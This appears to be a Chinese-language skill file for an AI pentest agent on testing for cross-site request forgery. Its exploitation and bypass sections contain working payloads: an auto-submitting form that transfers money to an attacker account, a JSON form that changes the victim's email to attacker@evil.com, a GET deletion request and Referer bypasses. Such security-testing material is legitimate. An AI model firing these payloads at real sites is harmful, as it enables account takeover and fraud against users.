---
name: csrf-testing
description: CSRF跨站请求伪造测试的专业技能和方法论
version: 1.0.0
---

# CSRF跨站请求伪造测试

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

CSRF（Cross-Site Request Forgery）是一种利用用户已登录状态进行未授权操作的攻击方式。本技能提供CSRF漏洞的检测、利用和防护方法。

## 漏洞原理

- 攻击者诱导用户访问恶意页面
- 恶意页面自动发送请求到目标网站
- 浏览器自动携带用户的认证信息（Cookie、Session）
- 目标网站误认为是用户合法操作

## 测试方法

### 1. 识别敏感操作

- 密码修改
- 邮箱修改
- 转账操作
- 权限变更
- 数据删除
- 状态更新

### 2. 检测CSRF Token

**检查是否有Token保护：**
```html
<!-- 有Token保护 -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- 无Token保护 - 存在CSRF风险 -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. 验证Token有效性

**测试Token是否可预测：**
- Token是否基于时间戳
- Token是否基于用户ID
- Token是否可重复使用
- Token是否在多个请求间共享

### 4. 检查Referer验证

**测试Referer检查是否可绕过：**
```javascript
// 正常请求
Referer: https://target.com/change-password

// 测试绕过
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (空)
```

## 利用技术

### 基础CSRF攻击

**HTML表单自动提交：**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**绕过Content-Type检查：**
```html
<!-- 使用form表单提交JSON -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET请求CSRF

**利用GET请求进行攻击：**
```html
<img src="https://target.com/api/delete?id=123">
```

## 绕过技术

### Token绕过

**如果Token在Cookie中：**
```javascript
// 如果Token同时存在于Cookie和表单中
// 可以尝试只提交Cookie中的Token
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // 不包含csrf_token参数，依赖Cookie
});
```

### SameSite Cookie绕过

**利用子域名：**
- 如果SameSite=Lax，GET请求仍可携带Cookie
- 利用子域名进行攻击

### 双重提交Cookie

**绕过Token验证：**
```html
<!-- 如果Token在Cookie中，且验证逻辑有缺陷 -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // 从Cookie中读取Token
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## 工具使用

### Burp Suite

**使用CSRF PoC生成器：**
1. 拦截目标请求
2. 右键 → Engagement tools → Generate CSRF PoC
3. 测试生成的PoC

### OWASP ZAP

```bash
# 使用ZAP进行CSRF扫描
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## 验证和报告

### 验证步骤

1. 确认目标操作没有CSRF Token保护
2. 构造恶意请求并验证可执行
3. 评估影响（数据泄露、权限提升、资金损失等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和受影响的操作
- 攻击场景和影响范围
- 完整的利用步骤和PoC
- 修复建议（CSRF Token、SameSite Cookie、Referer验证等）

## 防护措施

### 推荐方案

1. **CSRF Token**
   - 每个表单包含唯一Token
   - Token存储在Session中
   - 验证Token有效性

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **双重提交Cookie**
   - Token同时存在于Cookie和表单
   - 验证两者是否匹配

4. **Referer验证**
   - 验证Referer是否为同源
   - 注意空Referer的处理

## 注意事项

- 仅在授权测试环境中进行
- 避免对用户账户造成实际影响
- 记录所有测试步骤
- 考虑不同浏览器的行为差异